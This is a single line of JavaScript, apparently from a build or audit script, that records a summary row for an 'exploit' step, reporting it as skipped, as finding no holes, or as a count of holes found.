       summary.push({ Section: `[7/${n}] exploit`, Result: blocker ? "skipped" : build.holes.length === 0 ? "no holes" : `${build.holes.length} hole(s)` });
